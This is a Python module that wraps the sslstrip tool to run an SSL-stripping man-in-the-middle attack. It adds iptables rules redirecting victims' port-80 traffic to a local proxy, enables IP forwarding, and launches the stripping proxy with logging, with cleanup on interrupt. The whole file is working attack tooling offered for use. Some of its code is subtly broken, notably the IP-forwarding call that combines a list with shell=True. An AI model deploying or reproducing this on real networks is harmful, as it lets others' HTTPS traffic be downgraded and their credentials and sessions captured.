'''This package contains everything related to SSL stripping'''

import subprocess, logging
from twisted.web import http
from twisted.internet import reactor

from .sslstrip import *

def setup_iptables_redirect(listen_port, reset=False):
    try:
        if reset:
            # Run the iptables command to delete the redirection rule
            subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', listen_port])
        else:
            # Run the iptables command to redirect traffic from port 80 to port 25518
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', listen_port])
    
    except Exception as e:
        print(f'An error occurred while trying to setup iptables: {e}')

def set_ip_forwarding(enable=True):
    # Converting boolean to int makes it a 1 or 0. making it a string allows us to use it in the subprocess
    value = str(int(enable))

    subprocess.run(['echo', value, '>', '/proc/sys/net/ipv4/ip_forward'], shell=True)

def start_ssl_strip(log_file, log_level, listen_port):
    
    gVersion = 'adjusted 0.9'
        
    logging.basicConfig(level=log_level, format='%(asctime)s %(message)s',
                        filename=log_file, filemode='w')

    URLMonitor.getInstance().setFaviconSpoofing(False)
    CookieCleaner.getInstance().setEnabled(False)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(int(listen_port), strippingFactory)
                
    print('\nsslstrip ' + gVersion + ' by Moxie Marlinspike running...')

    reactor.run()

def ssl_strip_prepped(listen_port, log_file='sslstrip.log', log_level=logging.WARNING):
    try:
        setup_iptables_redirect(listen_port)
        set_ip_forwarding()
        start_ssl_strip(log_file, log_level, listen_port)
    except KeyboardInterrupt:
        set_ip_forwarding(False)
        setup_iptables_redirect(listen_port, True)